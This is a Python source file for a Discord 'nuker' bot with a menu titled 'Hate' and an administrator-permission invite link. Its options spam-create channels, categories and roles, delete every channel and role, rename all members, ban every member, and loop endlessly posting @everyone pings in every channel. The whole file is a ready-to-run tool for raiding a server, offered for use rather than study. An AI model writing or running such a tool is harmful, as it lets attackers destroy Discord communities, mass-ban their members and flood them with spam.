from colorama import Fore, init, Style
init(convert = True)

import time,os,datetime
import string
from random import *
import discord
import asyncio
from discord.ext.commands import bot
from discord.ext import commands


intents = discord.Intents.default()
intents.members = True

bottoken = "token here"

bot = commands.Bot(command_prefix='!',intents=intents)
bot.remove_command("help")
characters = string.ascii_letters + string.digits

os.system("cls")
os.system("title Hate")
abc = str("client id here")
menu = f"""
{Fore.WHITE}
{Fore.WHITE}https://discord.com/oauth2/authorize?client_id={abc}&permissions=8&scope=bot                                                            

██████╗░██╗███╗░░░███╗░░░███████╗██╗░░██╗███████╗
██╔══██╗██║████╗░████║░░░██╔════╝╚██╗██╔╝██╔════╝
██████╔╝██║██╔████╔██║░░░█████╗░░░╚███╔╝░█████╗░░
██╔═══╝░██║██║╚██╔╝██║░░░██╔══╝░░░██╔██╗░██╔══╝░░
██║░░░░░██║██║░╚═╝░██║██╗███████╗██╔╝╚██╗███████╗
╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝╚══════╝

{Fore.WHITE}[1] = Text Channel Creation.
{Fore.WHITE}[2] = Voice Channel Creation.
{Fore.WHITE}[3] = Category Creation.
{Fore.WHITE}[4] = Role Creation.
{Fore.WHITE}[5] = Delete All Channels and Categories.
{Fore.WHITE}[6] = Delete All Roles.
{Fore.WHITE}[7] = Nickname All Members.
{Fore.WHITE}[8] = Ban All Members.{Fore.WHITE}
{Fore.WHITE}[9] = Ping Everyone In Every Channel.{Fore.WHITE}"""


@bot.event
async def on_connect():
    abc = bot.user.id
    print(f"{Fore.WHITE}[!] Connected to bot : {bot.user.name}" )
	
	
@bot.event
async def on_ready():
    print(f"{Fore.WHITE}[+] Ready with bot : {bot.user.name}" )
    abc = bot.user.id
    time.sleep(1)
    while True:
        os.system("cls")
        option = input(f"{Fore.WHITE}{menu}\n[>] = ")
        if "1" in option:
            guild_id = int(input("[!] Guild ID?\n[>] "))
            guild = await bot.fetch_guild(guild_id)
            amount = int(input("[!] Number of text channels to make?\n[>] "))
            name = input("[!] Name of channels to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            for i in range (amount):   
                if random == "RANDOM":
                    name =  "".join(choice(characters) for x in range(randint(4, 15)))
                await guild.create_text_channel(name)
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE} Text Channel Created{Fore.WHITE} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating text channels - [{i+1}]")
            input(f"{Fore.WHITE}[  {Fore.WHITE}  +  {Fore.WHITE} ]{Fore.RED} Created All Channels {Fore.WHITE}:{Fore.WHITE} [{i+1}] ")
        elif "2" in option:
            guild_id = int(input("[!] Guild ID?\n[>] "))
            guild = await bot.fetch_guild(guild_id)
            amount = int(input("[!] Number of voice channels to make?\n[>] "))
            name = input("[!] Name of channels to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            for i in range (amount):  
                if random == "RANDOM":
                    name =  "".join(choice(characters) for x in range(randint(4, 15)))
                await guild.create_voice_channel(name)
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE}] Voice Channel Created{Fore.WHITE} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating voice channels - [{i+1}]")
            input(f"{Fore.WHITE}[  {Fore.WHITE}  +  {Fore.WHITE} ] {Fore.WHITE}Created All Channels {Fore.WHITE}:{Fore.WHITE} [{i+1}] \n[>] ")


        elif "3" in option:
            guild_id = int(input("[!] Guild ID?\n[>] "))
            guild = await bot.fetch_guild(guild_id)
            amount = int(input("[!] Number of categories to make?\n[>] "))
            name = input("[!] Name of categories to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            for i in range (amount):   
                if random == "RANDOM":
                    name =  "".join(choice(characters) for x in range(randint(4, 15)))
                await guild.create_category(name)
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE} Categories Created{Fore.WHITE} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating categories - [{i+1}]")
            input(f"{Fore.WHITE}[  {Fore.WHITE}  +  {Fore.WHITE} ] {Fore.WHITE}Created All Categories {Fore.WHITE}:{Fore.WHITE} [{i+1}] \n[>] ")
        elif "4" in option:
            guild_id = int(input("[!] Guild ID?\n[>] "))
            guild = await bot.fetch_guild(guild_id)
            amount = int(input("[!] Number of roles to make?\n[>] "))
            name = input("[!] Name of roles to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            colorcount = "red"
            for i in range (amount):   
                if random == "RANDOM":
                    name =  "".join(choice(characters) for x in range(randint(4, 15)))
                if colorcount == "red":
                    await guild.create_role(name=name,color=discord.Color.red())
                    colorcount = "black"
                elif colorcount == "black":
                    await guild.create_role(name=name,color=discord.Color.black())
                    colorcount = "red"
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE} Role Created{Fore.WHITE} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating roles - [{i+1}]")
            input(f"{Fore.WHITE}[  {Fore.WHITE}  +  {Fore.WHITE} ] {Fore.WHITE}Created All Roles {Fore.WHITE}:{Fore.WHITE} [{i+1}] \n[>] ")
 

        elif "5" in option:
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            for guild in bot.guilds:
                if guild.id == id:
                    for chan in guild.channels:
                        try:
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await chan.delete()
                            os.system(f"title Deleting all channels - [{count}]")
                            print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE} Channel Deleted{Fore.WHITE} :{Fore.WHITE} {chan.name}")
                        except:
                            print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE} Error Deleting Channel {Fore.WHITE} :{Fore.WHITE} {chan.name}")
                    input(f"{Fore.WHITE}[  {Fore.WHITE}  +  {Fore.WHITE} ] {Fore.WHITE}Deleted all channels {Fore.WHITE}:{Fore.WHITE} [{count}] \n[>] ")

        elif "6" in option:
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            for guild in bot.guilds:
                if guild.id == id:
                    for rol in guild.roles:
                        try:
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await rol.delete()
                            os.system(f"title Deleting all roles - [{count}]")
                            print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE} Role Deleted{Fore.WHITE} :{Fore.WHITE} {rol.name}")
                        except:
                            print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE} Error Deleting Role {Fore.WHITE} :{Fore.WHITE} {rol.name}")
                    input(f"{Fore.WHITE}[  {Fore.WHITE}  +  {Fore.WHITE} ] {Fore.WHITE}Deleted all Roles {Fore.WHITE}:{Fore.WHITE} [{count}] \n[>] ")


        elif "7" in option:
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            nick = input("[!] Name of nicknames to change? Type RANDOM for random character names!\n[>] ")
            random = nick.upper()   
            for guild in bot.guilds:
                if guild.id == id:
                    for mem in guild.members:
                        try:
                            if random == "RANDOM":
                                nick =  "".join(choice(characters) for x in range(randint(4, 15)))
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await mem.edit(nick=nick)
                            os.system(f"title Changing All Nicknames - [{count}]")
                            print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE} Nickname Changed {Fore.WHITE} :{Fore.WHITE} {mem.name} > {nick}")
                        except:
                            print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE} Problem Changing Nickname {Fore.WHITE} :{Fore.WHITE} {mem.name}")
                    input(f"{Fore.WHITE}[  {Fore.WHITE}  +  {Fore.WHITE} ] {Fore.WHITE}Changed All Nicknames {Fore.WHITE}:{Fore.WHITE} [{count}] \n[>] ")
                    
        elif "8" in option:
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))  
            for guild in bot.guilds:
                if guild.id == id:
                    for mem in guild.members:
                        try:
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await mem.ban()
                            os.system(f"title Banning Everyone - [{count}]")
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} User Banned: {Fore.RED} :{Fore.WHITE} {mem.name}")
                        except:
                            print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE} Problem Banning {Fore.WHITE} :{Fore.WHITE} {mem.name}")
                    input(f"{Fore.WHITE}[  {Fore.WHITE}  +  {Fore.WHITE} ] {Fore.WHITE}Finished Banning... {Fore.WHITE}:{Fore.WHITE} [{count}] \n[>] ")



        elif "9" in option:
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            messageee = input("After the @everyone, what should I say?\n[>] ")
            for guild in bot.guilds:
                if guild.id == id:
                    while True:
                        for chan in guild.channels:
                            try:
                                currentDT = datetime.datetime.now()
                                hour = str(currentDT.hour)
                                minute = str(currentDT.minute)
                                second = str(currentDT.second)
                                count = count + 1
                                await chan.send(f"@everyone {messageee}")
                                os.system(f"title Messages Sent : [{count}]")
                                print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE} Sent [@everyone {messageee}] in{Fore.WHITE} :{Fore.WHITE} {chan.name}")
                            except:
                                print(f"{Fore.WHITE}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.WHITE}]{Fore.WHITE} Error Messaging Channel {Fore.WHITE} :{Fore.WHITE} {chan.name}")

        else:
            print(f"{Fore.WHITE}[  {Fore.WHITE}  -  {Fore.WHITE} ] {Fore.WHITE} Invalid Input {Fore.WHITE}:{Fore.WHITE} {option} ")
            time.sleep(3)

bot.run(bottoken)